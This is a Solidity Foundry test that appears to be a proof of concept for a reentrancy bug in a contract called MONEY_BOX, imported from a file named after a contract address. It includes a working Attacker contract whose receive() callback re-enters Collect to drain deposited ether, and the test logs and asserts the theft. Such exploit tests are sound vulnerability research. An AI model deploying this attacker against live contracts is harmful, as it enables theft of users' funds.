// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";

contract Attacker {
    MONEY_BOX public moneyBox;
    uint256 public reentrancyCount;

    constructor(address payable _moneyBox) payable {
        moneyBox = MONEY_BOX(_moneyBox);
        moneyBox.Put{value: msg.value}(0);
    }

    function attack() public {
        moneyBox.Collect(1 ether);
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            moneyBox.Collect(1 ether);
        }
    }
}

contract MoneyBoxReentrancyTest is Test {
    MONEY_BOX public moneyBox;
    Log public logContract;
    Attacker public attacker;

    function setUp() public {
        // Deploy contracts
        logContract = new Log();
        moneyBox = new MONEY_BOX();

        // Configure moneyBox
        moneyBox.SetLogFile(address(logContract));
        moneyBox.SetMinSum(0);

        // Proper funding: Test contract gets 3 ETH total
        deal(address(this), 3 ether);
        
        // Deposit 2 ETH from test contract to MONEY_BOX
        moneyBox.Put{value: 2 ether}(0);

        // Create attacker with 1 ETH funding
        attacker = new Attacker{value: 1 ether}(payable(address(moneyBox)));
        
        // Advance time to pass unlock period
        vm.warp(block.timestamp + 1 days);
    }

    function testReentrancyVulnerability() public {
        // Record state before the attack
        uint256 initialBalance = address(moneyBox).balance;
        uint256 attackerBefore = address(attacker).balance;
        assertEq(initialBalance, 3 ether, "Initial balance should be 3 ETH");

        console2.log("--- BEFORE-Trigger State ---");
        console2.log("MONEY_BOX balance: %s", initialBalance);
        console2.log("Attacker balance: %s", attackerBefore);

        console2.log("--- Trigger Attack ---");
        attacker.attack();

        // Record state after the attack
        uint256 finalBalance = address(moneyBox).balance;
        uint256 attackerAfter = address(attacker).balance;

        console2.log("--- AFTER-Trigger State ---");
        console2.log("MONEY_BOX balance: %s", finalBalance);
        console2.log("Attacker balance: %s", attackerAfter);

        // Compute changes
        uint256 moneyBoxLoss = initialBalance - finalBalance;
        uint256 attackerGain = attackerAfter - attackerBefore;

        console2.log("MONEY_BOX loss: %s", moneyBoxLoss);
        console2.log("Attacker gain: %s", attackerGain);
        
        // Verify vulnerability exists
        if (moneyBoxLoss == 2 ether && attackerGain == 2 ether) {
            console2.log("Vulnerability Exists: attacker successfully drained 2 ETH from MONEY_BOX");
        } else {
            console2.log("Vulnerability not Exist: No fund drainage detected");
        }
        
        // Original assertion
        assertEq(finalBalance, 1 ether, "Reentrancy attack drained funds");
    }
}